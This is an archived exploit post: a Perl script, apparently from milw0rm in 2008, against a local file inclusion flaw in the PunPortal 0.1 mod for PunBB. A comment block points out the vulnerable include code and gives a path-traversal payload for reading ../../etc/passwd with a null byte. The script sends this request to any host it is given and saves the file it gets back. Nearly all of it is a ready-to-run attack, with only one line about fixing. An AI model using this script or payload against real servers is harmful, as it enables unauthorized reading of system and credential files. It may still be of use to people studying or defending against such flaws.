<html><head><title>PunBB Mod PunPortal 0.1 Local File Inclusion Exploit</title></head><pre>#!/usr/bin/perl

=about

    PunBB (PunPortal 0.1) Local File Inclusion Exploit
    --------------------------------------------------
    by athos - staker[at]hotmail[dot]it
    download mod http://www.punres.org/download.php?id=1108
    download cms http://punbb.org

    register globals = 1
    magic quotes gcp = 1
    
  
    
    File (include/login.php)
    
    1. &lt;?php
    2.
    3. // Show login if not logged in
    4. if($pun_user['is_guest'])
    5. {
    6. if(!isset($focus_element) || (isset($focus_element) &amp;&amp; !in_array('login', $focus_element)))
    7. {
    8. 
    9. // Load the language files
    10. require PUN_ROOT.'lang/'.$pun_user['language'].'/common.php';
    11. require PUN_ROOT.'lang/'.$pun_user['language'].'/login.php';
    
    
    $pun_user['is_guest'] isn't declared
    $pun_user['language'] isn't declared
    
    include/user/login.php?pun_user[is_guest]=a&amp;pun_user[language]=../../etc/passwd%00
    
    how to fix?use the latest version (2.0) 
     
    Usage: perl punbb.pl localhost/cms
    
=cut


use strict;
use warnings;
use IO::Socket;


my $html = undef;
my $site = $ARGV[0] or &amp;help;
my @take = split /\//,$site;

my ($host,$path) = @take;

if($site =~ /http:\/\/(.+?)/i) {
  print STDOUT &quot;Invalid URL\n&quot;;
  exit;
}

print STDOUT &quot;Local File (ex: ../../etc/passwd)\n&quot;;
print STDOUT &quot;Local File: &quot;;
  
chomp(my $file = &lt;STDIN&gt;);

if(not defined($file)) {
  print STDOUT &quot;File Not Defined!\n&quot;;
  exit;
}


my $evil = &quot;/include/user/login.php?pun_user[is_guest]=a&amp;pun_user[language]=&quot;;

my $sock = new IO::Socket::INET(
                                 PeerAddr =&gt; $host,
                                 PeerPort =&gt; 80,
                                 Proto    =&gt; 'tcp',
                                 Timeout  =&gt; 6,
                              ) or die $!;   

my $data = &quot;GET /${path}/${evil}${file}%00 HTTP/1.1\r\n&quot;.
           &quot;Host: $host\r\n&quot;.
           &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;.
           &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;.
           &quot;Accept-Language: en-us,en;q=0.5\r\n&quot;.
           &quot;Accept-Encoding: gzip,deflate\r\n&quot;.
           &quot;Connection: close\r\n\r\n&quot;;

$sock-&gt;send($data);

while(&lt;$sock&gt;) {
  $html .= $_;
}           

if($html =~ /(No such file or directory|HTTP\/1.1 404 Not Found)/i) {
  print STDOUT &quot;Exploit Failed!\n&quot;;
  exit;
}
else {
  my $name = int(rand(999)).'.txt';
  
  open(FILE,&quot;&gt;&quot;,$name);
  print FILE $html;
  close(FILE);
  
  print STDOUT &quot;Exploit Successfully!\n&quot;;
  print STDOUT &quot;$name saved!\n&quot;;
  exit;
}


sub help {
  print STDOUT &quot;PunBB (PunPortal 0.1) Local File Inclusion Exploit\n&quot;.
               &quot;by athos - staker[at]hotmail[dot]it\n&quot;.
               &quot;Usage: perl $0 [host/path]\n&quot;;
  exit;
}

# milw0rm.com [2008-11-20]</pre></html>